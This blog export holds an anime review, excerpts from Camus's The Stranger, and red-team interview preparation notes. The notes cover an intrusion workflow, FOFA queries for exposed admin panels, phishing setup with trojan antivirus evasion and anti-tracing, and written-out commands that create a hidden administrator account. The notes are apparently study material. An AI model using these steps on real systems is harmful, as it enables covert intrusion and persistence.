    <title>孤独摇滚--忐忑不安的吉他英雄</title>
    <url>/2022/12/26/%E5%AD%A4%E7%8B%AC%E6%91%87%E6%BB%9A%E5%8A%A8%E7%94%BB/</url>
    <content><![CDATA[<p><img src="/images/band_2.png" alt="band"></p>
<span id="more"></span>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>也许是今年看得最开心的新作动画。</p>
<h1 id="第一印象"><a href="#第一印象" class="headerlink" title="第一印象"></a>第一印象</h1><p>孤独摇滚是芳文社出版的四格漫画，老实说，虽然早就知道将要出动画，由于四格漫画画面太小，让人难以看进去，于是也就没有预先看漫画了。<br>看pv时，其实没有特别在意啦，只是预感会是一部还不错的动画，没想到最终大大超出预期，是一个很棒的惊喜~</p>
<h1 id="精妙的演出"><a href="#精妙的演出" class="headerlink" title="精妙的演出"></a>精妙的演出</h1><p>应当好好感谢制作组，如果中规中矩按照原作制作动画，大概会是中上水准，可却难以成为大多数人每周最期待的一部动画吧。<br>看动画时第一重要的是有趣，而动画也的确非常有趣，无论是在喜剧部分还是推动情节发展的地方都是“各司其职”，有条不紊。既不让人觉得混乱，也能看得十分开心。</p>
<ul>
<li><strong>创新性</strong><br>第1话运用的几个不同寻常的镜头很是吸引我：超广角，腿部运动镜头。这些对我来说都有一种新奇的美感。<br>不止如此，在乐队演奏方面也是不走寻常路，比如第8话十分重要的乐队演出，一般而言，这种重要的情景都会把其演奏过程制作得具有观赏性，而制作组明知这一点还是将一个很“烂”的live完全表现出来了。不得不说，虽然在演奏上是失败的，但如此大胆的策略让剧情更加自然，也一定会被很多人记住吧。</li>
<li><strong>想象力</strong><br>想象力是演出有趣与否的重要因素，在这方面，制作组拿出了：写实场景的水坝，3D建模，毕加索画作…一系列让人眼前一亮的元素，令人赞不绝口！</li>
<li><strong>契合度</strong><br>人物方面的契合度至少90%以上。波奇的声优甚至就是社恐，更是有一种声优与角色融为一体的感觉。我认为选择这样的声优比选知名声优好多了，无论一个声优多么有人气或是多么美丽，只要不适合，都应当一票否决。</li>
</ul>
<h1 id="观众的共鸣"><a href="#观众的共鸣" class="headerlink" title="观众的共鸣"></a>观众的共鸣</h1><p>本作在社恐方面做足了细节，这也直接导致了观众对这部作品产生强烈共鸣，将角色代入自身。虽然观众大多不会对社交完全恐惧，同样也不会完全外向。生活中的人们，多多少少有些社交上的恐惧感，尽管不如波奇，也只不过是层级不同罢了。<br>随便一举都有很多：期望别人主动和自己搭话、不敢直视别人、不会拒绝别人、不敢去人多的地方、穿着土气、弯腰驼背、害怕冒犯别人、团队协作能力较差、别人一夸赞自己就沾沾自喜或者觉得这个人是好人、没有外号、不会跟不熟的人打招呼、没有朋友、不敢一个人进店、想去没有同学认识自己的地方、独来独往、会进入自己的世界、无法打工、一个人吃饭、喜欢幻想、几个人说话的时候插不上嘴……细节太多怎也道不完。有些比较夸张，可这是喜剧，也没必要纠结了。<br>孤单与喜欢独处的人是不一样的。波奇是孤单的人，但凉是喜欢独处并且充满自信。我大概也是和凉更为相像吧。</p>
<h1 id="喜剧的剖析"><a href="#喜剧的剖析" class="headerlink" title="喜剧的剖析"></a>喜剧的剖析</h1><p>本作中主要出现的喜剧方面有，因波奇的内向而让她作出与常人不同的行为或想法而产生的反差造成的喜感，或是通过画面夸张化波奇的社恐心理（波奇融化，波奇变成赛博朋克，波奇变成恐龙等等），还有乐队四人不同个性的有趣小日常。</p>
<h1 id="乐队的成长"><a href="#乐队的成长" class="headerlink" title="乐队的成长"></a>乐队的成长</h1><p>波奇从一个害怕与人社交的高中生，最终成为乐队里不可或缺的一份子。中间也是一路艰辛啊。<br>第1阶段，无法与乐队成员在演奏上好好配合，无论什么事都很被动，也很害怕与人打交道，甚至无法在台上露脸演奏。（1话）<br>第2阶段，稍微变得主动了一些，也能够独自进店了，打工时勉强能直视顾客的眼睛。还是害怕与别人有所不同，一旦做了什么错事或没做到什么会害怕得不能自已，看到别人享受青春的样子会很难受，不敢与别人搭话。（2-7话）<br>第3阶段，配合变好了一些，乐队之间的关系更加亲密了。（8-12话）</p>
<p>喜多从第3话一个乐队外行人到了最终话演奏的时候也变得能够独自演奏一些片段了。</p>
<p>整个乐队从配合松散的四人慢慢变为了有默契的四人，一起打工，一起游玩，一起演奏，一起出行…四人一起更加有乐队的感觉了。</p>
<h1 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h1><p>虽然只有短短12话，我却看得十分尽兴。<br>第5话，第8话，第12话这三段演奏都做得非常好，即便如此，还是有部分人不满，原因很简单，没有爆点。追求快的时代，拿不出一个爆点的话，那么是很难吸引快节奏人的目光的。从我个人的意愿来说，也不例外，希望有能够惊为天人的live。虽然没有期待到啦，不过也不至于成为挑刺的地方。三段演奏都是蛮棒的，写实的风格，创新的演出，越看越耐看的live，都是无可挑剔的。<br>最喜欢的角色嘛，是虹夏。现在虹夏已经被大家尊称为“下北泽の大天使”了hhh。<br>如果说我在四个人里最像凉，那么大概也能明白为什么一开始凉是和虹夏一起的了。若要问喜欢的原因，大概是那份细腻感吧，能够注意到乐队其他人不会注意到的事，而且还那么温柔，与喜多那种外向的阳光普照大地不同，虹夏的阳光是单独照射着她所在意的人的。还有也非常可爱啊，第5话最后那个告别怎能叫人不心动呢！<br><img src="/images/%E8%99%B9%E5%A4%8F_4.gif" alt="虹夏告别"></p>
<h1 id="总的来说"><a href="#总的来说" class="headerlink" title="总的来说"></a>总的来说</h1><p>赶紧出下一季！</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>动画评价写得好烂，还写了那么久，什么时候能写好一点啊！</p>
]]></content>
      <categories>
        <category>动画</category>
        <category>孤独摇滚</category>
      </categories>
      <tags>
        <tag>孤独摇滚</tag>
      </tags>
  </entry>
  <entry>
    <title>局外人-摘抄</title>
    <url>/2023/03/23/%E5%B1%80%E5%A4%96%E4%BA%BA-%E6%91%98%E6%8A%84%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p><img src="/images/night2.png" alt="night"></p>
<span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今日偶然间，因不想学习，读完了加缪的《局外人》这本书。慕名已久，读了大概两三小时。</p>
<h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>他说他一直在研究我的灵魂，结果发现其中空虚无物。他说我实际上没有灵魂，没有丝毫人性，没有任何一条在人类灵魂中占神圣地位的道德原则，所有这些都与我格格不入。</p>
<h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p>这时，不知是为什么，好像我身上有什么东西爆裂开来，我扯着嗓子直嚷，我叫他不要为我祈祷，我抓住他长袍的领子，把我内心深处的喜怒哀乐猛地一股脑儿倾倒在他头上。他的神气不是那么确信有把握吗？但他的确信不值女人的一根头发，他甚至连自己是否活着都没有把握，因为他干脆就像行尸走肉。而我，我好像是两手空空，一无所有，但我对自己很有把握，对我所有的一切都有把握，比他有把握得多，对我的生命，对我即将来到的死亡，都有把握。是的，我只有这份把握，但至少我掌握了这个真理，正如这个真理抓住了我一样。我以前有理，现在有理，将来永远有理。我以这种方式生活过，我也可能以另外一种方式生活。我干过这，没有干过那，我做过这样的事，而没有做过那样的事。而以后呢？似乎我过去一直等待的就是这一分钟，就是我也许会被判无罪的黎明。没有任何东西，没有任何东西是有重要性的，我很明白是为什么。他也知道是为什么。在我所度过的整个那段荒诞生活期间，一种阴暗的气息从我未来前途的深处向我扑面而来，它穿越了尚未来到的岁月，所到之处，使人们曾经向我建议的所有一切彼此之间不再有高下优劣的差别了，未来的生活也并不比我已往的生活更真切实在。其他人的死，母亲的爱，对我有什么重要？既然注定只有一种命运选中了我，而成千上万的生活幸运儿都像他这位神甫一样跟我称兄道弟，那么他们所选择的生活，他们所确定的命运，他们所尊奉的上帝，对我又有什么重要？他懂吗？大家都是幸运者，世界上只有幸运者。有朝一日，所有的其他人无一例外，都会判死刑，他自己也会被判死刑，幸免不了。这么说来，被指控杀了人，只因在母亲的葬礼上没有哭而被处决，这又有什么重要呢？沙拉玛诺的狗与他的妻子没有什么区别，那个自动机械式的小女人与马松所娶的那个巴黎女人或者希望嫁给我的玛丽，也都没有区别，个个有罪。雷蒙是不是我的同伙与塞莱斯特是不是比他更好，这有什么重要？今天，玛丽是不是又把自己的嘴唇送向另一个新默尔索，这有什么重要？他这个也被判了死刑的神甫，他懂吗？从我未来死亡的深渊里，我喊出了这些话，喊得喘不过气来。但这时，有人把神甫从我手中救了出去，看守们狠狠吓唬我。而神甫却劝他们安静下来，他默默地看了我一会儿。他眼里充满了泪水，他转过身去走开，消失掉了。</p>
<h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><p>而我，我现在也感到自己准备好把一切再过一遍。好像刚才这场怒火清除了我心里的痛苦，掏空了我的七情六欲一样，现在我面对着这个充满了星光与默示的夜，第一次向这个冷漠而未温情尽失的世界敞开了我的心扉。我体验到这个世界如此像我，如此友爱融洽，觉得自己过去曾经是幸福的，现在仍然是幸福的。为了善始善终，功德圆满，为了不感到自己属于另类，我期望处决我的那天，有很多人前来看热闹，他们都向我发出仇恨的叫喊声。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>圆满了。</p>
]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>读书笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>护网面试准备</title>
    <url>/2023/03/15/%E6%8A%A4%E7%BD%91%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>写了30道，才发现在网上找的面试题是蓝队的，而且还是流传了好久以前的，我都不知道咋说了。只能说大意了吧。</p>
<span id="more"></span>
<h1 id="面试题目"><a href="#面试题目" class="headerlink" title="面试题目"></a>面试题目</h1><h2 id="描述外网打点的流程？"><a href="#描述外网打点的流程？" class="headerlink" title="描述外网打点的流程？"></a>描述外网打点的流程？</h2><ol>
<li><p>打点的基本认识<br>所谓打点，就是拿到一台机器的shell。打点的目的一般在于利用这台机器作为跳板进入内网。一个红队人员快速打点能力的强悍与否，是区别普通红队和优秀红队的因素之一。</p>
</li>
<li><p>打点的基本方法<br>流程：靶标确认–信息收集–漏洞探测–漏洞利用–权限获取<br>其中，信息收集技术含量低，过程可用工具相对优化，但是仍然需要大量劳力。</p>
</li>
</ol>
<p>靶标确认：确认攻击目标范围，防止攻击打偏的情况，例如IP段、子域名等域名信息</p>
<p>信息收集：信息收集分为基础信息收集与进阶信息收集，基础信息收集包括域名备案信息、真实IP等：进阶信息收集包含靶标端口开放情况、网站目录结构、防护设备信息等。</p>
<p>漏洞探测：根据信息收集的情况找到合适的漏洞poc进行测试，也可使用漏洞扫描器对靶标进行全方位漏洞探测</p>
<p>漏洞利用：poc测试完成之后，确认漏洞，使用exp攻击获取部分权限（如数据库权限，webshell权限等）</p>
<p>权限提升与维持：获取到基础权限之后，可以通过认证绕过、溢出漏洞等本地提权方式获取去靶标的高级权限（管理员权限、系统权限等）</p>
<p>横向移动：当获取到靶标的最高权限，可以尝试获取靶标所在内网中的其他的机器权限。</p>
<p><strong>信息收集</strong>大致步骤：<br>（1）得到攻击目标（假设为公司），通过企查查等平台搜索，得到公司和子公司信息。<br>（2）通过公司和子公司信息，通过oneforall，得到子域名。<br>（3）将子域名拿到Eeyes(棱眼)跑一遍，得到子域名所对应的IP和C段信息。（C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器。）<br>（4）将对应IP和C段丢给fofa和fscan，fofa能快速得到C段资产信息；fscan能快速扫一遍，顺便打一下常见漏洞。（Fofa 是白帽汇推出的一款网络空间搜索引擎，它通过进行网络空间测绘，能够帮助研究人员或者企业迅速进行网络资产匹配。 例如进行漏洞影响范围分析、应用分布统计、应用流行度等。 在渗透测试过程中，Fofa能帮助测试人员快速发现目标资产。）（Fscan是一款内网综合扫描工具，它非常的方便，一键启动，之后完全自动化、并且全方位漏洞扫描。 它支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能。）<br>（5）如果fscan爆出漏洞可拿去利用（小概率）<br>（6）查看通过fofa得到的资产，可配合ehole的指纹识别来快速筛选。通过筛选敏感资产（如shiro, fastjson等）直接能够反序列化getshell的资产（小概率）。（EHole是一款对资产中重点系统指纹识别的工具，在红队作战中，信息收集是必不可少的环节，如何才能从大量的资产中提取有用的系统(如OA、VPN、Weblogic…)。 EHole旨在帮助红队人员在信息收集期间能够快速从C段、大量杂乱的资产中精准定位到易被攻击的系统，从而实施进一步攻击。）<br>（7）获得了登陆后台&#x2F;用户登录&#x2F;注册&#x2F;管理员等交互类型的资产后，可以尝试进行反序列化漏洞&#x2F;文件上传漏洞&#x2F;SQL注入等漏洞。<br>（8）对各种登录系统尝试弱口令&#x2F;SQL注入攻击，弱口令能登入后台就找上传点，SQL注入建议xray+burp检测，有戏再用sqlmap。fofa搜关键字，title&#x3D;”单位名”等，可自行穿插灵活使用，有时有效。弱口令登云桌面(horizen,vdi等)拿到shell的方式可尝试（小概率）。<br>（9）弱口令如果爆不出账号密码，考虑上 网盘&#x2F;GitHub&#x2F;社工库&#x2F;泄露公开库 搜对应人员信息，看是否有效。<br>（10）若无用，则查看 公众号&#x2F;app&#x2F;小程序 的信息。<br>（11）若无用，开始使用 域传送&#x2F;备案号&#x2F;IP反查网站&#x2F;ssl证书&#x2F;Google 来搜C段。<br>（12）若无用，使用 dirmap&#x2F;dirsearch 对可疑网站进行目录爆破。<br>（13）若无用，发钓鱼邮件。（网络钓鱼攻击者利用欺骗性的电子邮件和伪造的 Web 站点来进行诈骗活动，受骗者往往会泄露自己的<br>财务数据，如信用卡号、帐户用户名和口令等内容。诈骗者通常会将自己伪装成知名银行、在线零售<br>商和信用卡公司等可信的站点，在所有接触诈骗信息的用户中，有高达5%的人都会对这些骗局做出响<br>应 。）<br>（14）若无用，申请近源渗透。（近源渗透通俗而言就是通过乔装、社工等方式实地物理侵入企业办公区域，通过其内部各种潜在攻击面（如Wi-Fi网络、RFID门禁、暴露的有线网口、USB接口等）获得“战果”，最后以隐秘的方式将评估结果带出上报，由此证明企业安全防护存在漏洞。）</p>
<p>可能用到的工具：</p>
<ul>
<li>ENScan: 企业信息查询工具。</li>
<li>Netcraft,站长工具：网站基本信息收集</li>
<li>Oneforall: 子域名收集工具</li>
<li>水泽：信息收集自动化工具</li>
<li>Wappalyzer: 网站技术识别工具。</li>
<li>Eeyes: 快速筛选真实IP并整理为C段</li>
<li>Goby: 网络安全测试工具，由赵武打造，它能对一个目标企业梳理最全的攻击面信息，能够快速的从一个验证入口点，切换到横向。</li>
<li>FOFA: 网络空间资产搜索引擎</li>
<li>Fscan: 是一款内网综合扫描工具</li>
<li>Masscan：一个批量端口扫描器</li>
<li>nmap：端口扫描工具</li>
<li>ARL资产安全灯塔：快速侦察与目标关联的资产工具</li>
<li>EHole: 是一款对资产中重点系统指纹识别的工具</li>
<li>xray: 用于SQL注入检测</li>
</ul>
<ol start="3">
<li>打点的技术区分线<br>漏洞利用是否成功。<br>失败原因有：出网却无法反弹shell，能反弹shell却时不时断开，能写能连内存马但是无法下载或上传较大文件，其它都成功但执行特定命令就会失败……</li>
</ol>
<h2 id="举几个-FOFA-在外网打点过程中的使用小技巧"><a href="#举几个-FOFA-在外网打点过程中的使用小技巧" class="headerlink" title="举几个 FOFA 在外网打点过程中的使用小技巧"></a>举几个 FOFA 在外网打点过程中的使用小技巧</h2><ul>
<li>后台挖掘：title&#x3D;”后台” &amp;&amp; body&#x3D;”password” &amp;&amp; host&#x3D;”x.cn”</li>
<li>子域名：title !&#x3D; ‘404’ &amp;&amp; title!&#x3D;’302’ &amp;&amp; host&#x3D;’x.cn’</li>
<li>C段：ip&#x3D;’x.x.x.x&#x2F;24’ &amp;&amp; host&#x3D;’x.cn’</li>
<li>框架特征：body&#x3D;’icon-spring-boot-admin.svg’</li>
<li>漏洞：body&#x3D;’index&#x2F;of’ [列目录漏洞]</li>
</ul>
<h2 id="如何识别CDN？"><a href="#如何识别CDN？" class="headerlink" title="如何识别CDN？"></a>如何识别CDN？</h2><ol>
<li><p>CDN简介<br>CDN全称是Content Delivery Network，即内容分发网络。其基本思想是尽可能避开网络上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。<br>CDN的关键技术主要有内容存储和分发技术。</p>
</li>
<li><p>识别CDN的方法<br>（1）ping目标主域<br>如果ping的名称和返回信息的名称不同，可知是使用了CDN。<br>（2）nslookup使用不同的DNS域名解析<br>通过不同的DNS域名解析同一域名，如果解析结果不同，则很可能使用了CDN服务<br>比如：<br><code>nslookup www.jd.com 8.8.8.8</code><br><code>nslookup www.jd.com 114.114.114.114</code></p>
</li>
</ol>
<p>（3）通过全国ping<br>ping出的结果有多个IP地址则说明，使用了CDN<br>（4）使用工具<br>比如<br><code>https://www.cdnplanet.com/tools/cdnfinder</code></p>
<h2 id="邮件钓鱼的准备工作有哪些？"><a href="#邮件钓鱼的准备工作有哪些？" class="headerlink" title="邮件钓鱼的准备工作有哪些？"></a>邮件钓鱼的准备工作有哪些？</h2><ol>
<li><p>网络钓鱼攻击的概述<br>网络钓鱼攻击是经常使用社会工程诱饵或引诱内容的骗局。链接到网络钓鱼网站的合法通信（通常是电子邮件）是网络钓鱼攻击中最常见的方法之一。网络钓鱼网站通常模拟需要用户输入凭据和账户信息的登录界面。然后，网络钓鱼网站在用户提供敏感信息后立即捕获该信息，使攻击者能够访问该信息。<br>下面是攻击者用来尝试窃取信息或获取设备访问权限的一些最常见的网络钓鱼技术。<br>（1）发票网络钓鱼<br>（2）付款&#x2F;送货诈骗<br>（3）以税务为主题的网络钓鱼诈骗<br>（4）下载内容<br>（5）发送其它威胁的网络钓鱼电子邮件<br>（6）Spear 网络钓鱼<br>（7）捕鲸<br>（8）商业电子邮件泄露</p>
</li>
<li><p>准备工作<br>（1）准备邮件钓鱼的形式：链接、文件<br>（2）收集目标相关的邮箱<br>（3）编写钓鱼邮件文案<br>（4）匿名邮箱<br>（5）木马免杀测试、钓鱼站点搭建<br>（6）反溯源</p>
</li>
</ol>
<h2 id="判断出靶标的CMS，对外网打点有什么意义？"><a href="#判断出靶标的CMS，对外网打点有什么意义？" class="headerlink" title="判断出靶标的CMS，对外网打点有什么意义？"></a>判断出靶标的CMS，对外网打点有什么意义？</h2><ol>
<li><p>CMS概述<br>CMS是Content Management System的缩写，意为内容管理系统。是一种位于WEB前端（Web服务器）和后端办公系统或流程（内容创作、编辑）之间的软件系统。</p>
</li>
<li><p>CMS对外网打点的意义<br>（1）判断当前使用的CMS是否存在Nday，然后利用公开的poc,exp进行尝试。<br>（2）根据CMS特征关联同CMS框架站点，进行敏感备份文件扫描，有可能获得站点备份文件。尝试从CMS源码进行代码审计，挖掘潜在漏洞。</p>
</li>
</ol>
<p>tips:<br>0 day:未被公开的漏洞<br>1 day:刚刚公布的漏洞<br>n day:已公布n天的漏洞</p>
<h2 id="Apache-Log4j2的漏洞原理是什么？"><a href="#Apache-Log4j2的漏洞原理是什么？" class="headerlink" title="Apache Log4j2的漏洞原理是什么？"></a>Apache Log4j2的漏洞原理是什么？</h2><p>Log4j2组件在处理程序日志记录时存在JNDI注入缺陷，未经授权的攻击者利用该漏洞，可向目标服务器发送精心构造的恶意数据，触发Log4j2组件解析缺陷，实现目标服务器的任意代码执行，获得目标服务器权限。</p>
<h2 id="水坑攻击和鱼叉攻击的区别是什么？"><a href="#水坑攻击和鱼叉攻击的区别是什么？" class="headerlink" title="水坑攻击和鱼叉攻击的区别是什么？"></a>水坑攻击和鱼叉攻击的区别是什么？</h2><p>水坑攻击(watering hole)：在受害者必经之路设置一个水坑，也即陷阱。常见做法是攻击者分析目标的上网活动规律，经常访问哪些网站，然后利用网站漏洞在其中植入攻击代码，用户访问该网站就中招了。这种方式隐蔽性高，成功率较高。</p>
<p>鱼叉攻击是指利用木马程序作为电子邮件附件，发送到目标电脑，诱导受害者打开附件感染木马。</p>
<h2 id="如何判断靶标站点是windows-x2F-linux"><a href="#如何判断靶标站点是windows-x2F-linux" class="headerlink" title="如何判断靶标站点是windows&#x2F;linux?"></a>如何判断靶标站点是windows&#x2F;linux?</h2><ol>
<li>大小写检测：windows大小写不敏感，Linux大小写敏感。</li>
<li>ping命令：根据TTL值，windows一般大于100，Linux小于100（TTL，生存时间值：该字段指定IP包被路由器丢弃之前允许通过的最大网段数量）</li>
</ol>
<h2 id="无法连接服务器3389端口的几种情况？"><a href="#无法连接服务器3389端口的几种情况？" class="headerlink" title="无法连接服务器3389端口的几种情况？"></a>无法连接服务器3389端口的几种情况？</h2><ol>
<li><p>3389端口<br>3389端口是Windows 2000(2003) Server 远程桌面的服务端口，可以通过这个端口，用类似于“远程桌面”的连接工具连接到远程服务器，如果连上了，输入系统管理员的用户名和密码后，将变得可以像操作本机一样操作远程电脑，因此远程服务器端口一般都将这个端口修改数值或关闭。</p>
</li>
<li><p>无法连接的原因<br>（1）3389端口处于关闭状态<br>（2）远程桌面默认端口号被修改<br>（3）防火墙 拦截<br>（4）处于内网环境<br>（5）超过了服务器最大的连接数<br>（6）管理员设置了权限，指定用户才能通过3389端口访问</p>
</li>
</ol>
<h2 id="如何建立隐藏用户？"><a href="#如何建立隐藏用户？" class="headerlink" title="如何建立隐藏用户？"></a>如何建立隐藏用户？</h2><ol>
<li>添加$符来添加隐藏用户并加入管理员组<br><code>net user username$ password /add</code><br><code>net localgroup administrators username$ /add</code></li>
</ol>
<p>通过该方法建立隐藏用户后，使用 <code>net user</code> 命令不会显示该隐藏用户，但是在控制面板或使用命令 <code>wmic useraccount get Name</code> 可以看到该隐藏用户。<br>删除该用户只需要 <code>net user username$ /del</code></p>
<ol start="2">
<li><p>修改注册表<br>打开注册表，路径如下：<br><code>HKEY_LOCAL_MACHINE\SAM\SAM\</code><br>……<br>以该方法建立的隐藏用户，命令 <code>net user</code> 和控制面板都看不到该用户。<br>但是注册表和wmic能看到该用户。</p>
</li>
<li><p>使用工具</p>
</li>
</ol>
<p>方法2,3的具体操作步骤看这篇文章: <a href="https://teamssix.com/220118-134825.html">创建隐藏账号-TeamsSix</a></p>
<h2 id="为什么MySQL数据库的站点，无法连接？"><a href="#为什么MySQL数据库的站点，无法连接？" class="headerlink" title="为什么MySQL数据库的站点，无法连接？"></a>为什么MySQL数据库的站点，无法连接？</h2><ol>
<li>站库分离<br>站库分离是管理员将网站程序和数据库分别放到了不同的内网服务器上。大多出现在内网环境，少部分会使用公网数据库（如：自建公网数据库、Amazon&#x2F;阿里&#x2F;腾讯等）。</li>
<li>3306端口未对外开放（3306是MySQL默认端口）</li>
<li>MySQL默认端口被修改</li>
</ol>
<h2 id="文件上传功能的监测点有哪些？"><a href="#文件上传功能的监测点有哪些？" class="headerlink" title="文件上传功能的监测点有哪些？"></a>文件上传功能的监测点有哪些？</h2><ol>
<li>客户端Javascript检测（文件后缀名检测）</li>
<li>服务端检测（MIME类型检测、文件后缀名、文件格式头）<br>MIME（多用途互联网邮件扩展类型）<br>服务端MIME类型检测是通过检查http包的Content-Type字段中的值来判断文件是否合法。</li>
</ol>
<h2 id="常见的未授权访问漏洞有哪些？"><a href="#常见的未授权访问漏洞有哪些？" class="headerlink" title="常见的未授权访问漏洞有哪些？"></a>常见的未授权访问漏洞有哪些？</h2><p>未授权访问漏洞：在需要安全配置或权限认证的地址、授权页面存在缺陷，导致其他用户可以直接访问，从而引发重要权限可被操作、数据库、网站目录等铭感信息泄露。</p>
<ol>
<li>Reddis 未授权访问漏洞</li>
<li>MongoDB 未授权访问漏洞</li>
<li>Jenkins 未授权访问漏洞</li>
<li>Memcached 未授权访问漏洞</li>
<li>JBOSS 未授权访问漏洞</li>
<li>VNC 未授权访问漏洞</li>
<li>Docker 未授权访问漏洞</li>
<li>ZooKeeper 未授权访问漏洞</li>
<li>Rsync 未授权访问漏洞</li>
<li>Atlassian 未授权访问漏洞</li>
<li>CouchDB 未授权访问漏洞</li>
<li>Elasticsearch 未授权访问漏洞</li>
<li>Hadoop 未授权访问漏洞</li>
<li>Jupyter Notebook 未授权访问漏洞</li>
</ol>
<h2 id="代码执行、文件读取、命令执行的函数有哪些？"><a href="#代码执行、文件读取、命令执行的函数有哪些？" class="headerlink" title="代码执行、文件读取、命令执行的函数有哪些？"></a>代码执行、文件读取、命令执行的函数有哪些？</h2><p>代码执行: <code>eval(), call_user_func(), call_user_func_array(), assert(), preg_replace(), create_function(), array_map()</code><br>文件读取: <code>fopen(), readfile(), fread(), file(), show_resource()</code><br>命令执行: <code>system(), exec(), shell_exec(), passthru(), pcntl_exec()</code></p>
<h2 id="正向shell和反向shell的区别是什么？"><a href="#正向shell和反向shell的区别是什么？" class="headerlink" title="正向shell和反向shell的区别是什么？"></a>正向shell和反向shell的区别是什么？</h2><p>正向shell：攻击机主动连接靶机。可用于攻击机处于内网，靶机处于公网（外网）。<br>反向shell：靶机主动连接攻击机。可用于攻击者处于公网，靶机处于内网。</p>
<h2 id="正向代理和反向代理的区别？"><a href="#正向代理和反向代理的区别？" class="headerlink" title="正向代理和反向代理的区别？"></a>正向代理和反向代理的区别？</h2><ol>
<li>正向代理(forward proxy):是一个位于客户端和目标服务器之间的服务器（代理服务器），为了从目标服务器取得内容，客户端向代理服务器发送一个请求并指定目标，然后代理服务器向目标服务器转交请求并将获得的内容返回给客户端。</li>
<li>反向代理(reverse proxy):是指以代理服务器来接受Internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给Internet上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。</li>
<li>区别<br>（1）实质上，正向代理是客户端代理，帮助客户端访问其无法访问的资源；反向代理是服务器代理，帮助服务器做负载均衡，安全防护等。<br>（2）正向代理一般是客户端架设的，比如在自己机器上安装代理软件；反向代理一般是服务器架设的，比如在机器集群中部署一个反向代理服务器。<br>（3）正向代理中服务器不知道真正的客户端是谁；反向代理中客户端不知道真正的服务器是谁。<br>（4）二者目的和作用不同，正向代理主要用来解决访问限制问题，反向代理主要是提供负载均衡、安全防护等作用。二者均能提高访问速度。</li>
</ol>
<h2 id="Web-Top10-漏洞是什么（OWASP-2022）"><a href="#Web-Top10-漏洞是什么（OWASP-2022）" class="headerlink" title="Web Top10 漏洞是什么（OWASP 2022）"></a>Web Top10 漏洞是什么（OWASP 2022）</h2><ol>
<li>失效的访问控制</li>
<li>加密机制失效</li>
<li>注入</li>
<li>不安全的设计</li>
<li>安全配置错误</li>
<li>易受攻击和过时组件</li>
<li>识别和认证失败</li>
<li>软件和数据完整性故障</li>
<li>安全日志记录和监控失败</li>
<li>服务器端请求伪造SSRF<br><a href="https://blog.csdn.net/Gherbirthday0916/article/details/126786601">OWASP Top 10 2022介绍</a></li>
</ol>
<h2 id="SQL注入种类有哪些？"><a href="#SQL注入种类有哪些？" class="headerlink" title="SQL注入种类有哪些？"></a>SQL注入种类有哪些？</h2><ol>
<li>按照注入点类型分为：数字型，字符型，搜索型。</li>
<li>按照提交方式分为：get型，post型，cookie型，http请求头。</li>
<li>按照注入手法分为：联合注入，报错注入，布尔盲注，时间盲注，二次注入，宽字节注入，堆叠注入。</li>
</ol>
<h2 id="常见的中间件有哪些？分别有哪些漏洞？"><a href="#常见的中间件有哪些？分别有哪些漏洞？" class="headerlink" title="常见的中间件有哪些？分别有哪些漏洞？"></a>常见的中间件有哪些？分别有哪些漏洞？</h2><ol>
<li><p>IIS是Internet Information Services的缩写，意为互联网信息服务。是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。IIS目前只适用于Windows系统。<br>常见漏洞：目录解析漏洞，文件名解析漏洞，远程代码执行漏洞</p>
</li>
<li><p>Apache是一种跨平台的Web服务器，可以在多种操作系统上运行，如Windows,Linux,Unix等。它支持多种编程语言，如PHP,Perl,Python等。<br>常见漏洞：服务端请求伪造漏洞，目录遍历漏洞，解析漏洞</p>
</li>
<li><p>Nginx是一款轻量级的Web服务器&#x2F;反向代理服务器及电子邮件（IMAP&#x2F;POP3）代理服务器，特点是占有内存小，并发能力强。<br>常见漏洞：解析漏洞，目录遍历，目录穿越，任意代码执行漏洞</p>
</li>
<li><p>JBoss是一个基于J2EE的开源代码应用服务器，由Red Hat公司开发，它是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3规范。开源，免费。<br>常见漏洞：反序列化漏洞，后台部署war包</p>
</li>
<li><p>Weblogic是美国Oracle公司出品的一个application server,确切的说是一个基于JavaEE架构的中间件，Weblogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。<br>常见漏洞：反序列化漏洞， 任意文件上传漏洞，SSRF</p>
</li>
</ol>
<h2 id="常见的目录扫描工具有哪些？"><a href="#常见的目录扫描工具有哪些？" class="headerlink" title="常见的目录扫描工具有哪些？"></a>常见的目录扫描工具有哪些？</h2><p>常见的目录扫描工具有御剑、DirBuster、Webdirscan、Cansina、Dirsearch、awvs、wwwscan、dirmap等。</p>
<h2 id="Windows常见的提权方法有哪些？"><a href="#Windows常见的提权方法有哪些？" class="headerlink" title="Windows常见的提权方法有哪些？"></a>Windows常见的提权方法有哪些？</h2><ol>
